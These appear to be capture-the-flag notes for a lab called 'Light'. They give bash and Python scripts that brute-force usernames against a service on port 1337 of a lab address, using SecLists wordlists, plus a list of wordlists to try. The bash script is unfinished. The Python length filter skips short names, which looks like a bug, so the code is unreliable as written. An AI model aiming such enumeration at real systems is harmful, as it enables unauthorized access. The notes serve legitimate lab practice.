# Light

_**Bash script to brute force the password:**_

```bash
#!/usr/bin/bash

filename="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"

while IFS="" read -r line; do
	# eg. echo smokey | nc <target> 1337
	res=$(echo "$line" | nc -w 1 <target> 1337)

	if [[ "$res" == *"not found"* ]]; then
		# if the substring "not found" is present, means user not found
		...
	else
		# print success message and exit
		...
	fi;

done < "$filename"


```

_**Python script:**_

```python
#!/usr/bin/python3

import socket

HOST='10.10.34.209'
PORT=1337
#filename='/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt'
#filename='test.txt'
#filename='/usr/share/wordlists/SecLists/Usernames/Names/names.txt'
#filename='/usr/share/wordlists/SecLists/Usernames/Names/femalenames-usa-top1000.txt'
#filename='Security-Research/tools/aws-pentest-tools/iam_user_enum/default-word-list.txt'
filename='wordlist/usernames.txt'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST,PORT))
    s.recv(1024) # flush 1
    s.recv(1024) # flush 2


    f = open(filename, 'r')

    for username in f:
        if len(username) <= 10:
            continue

        username = username.lower()

        print(f'[!] Trying {username.replace('\n', '')}', end=' ')
        
        s.send(bytes(username, 'utf-8'))
        data = s.recv(1024)
        str_data = str(data, 'utf-8')

        if 'not found' in str_data:
            print('failed')
            s.recv(50)

        else:
            print(str_data)
            break

    f.close()

```



_**Word-lists to try out**_:

1. /`usr/share/wordlists/seclists/Usernames/Names/names.txt`
2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`
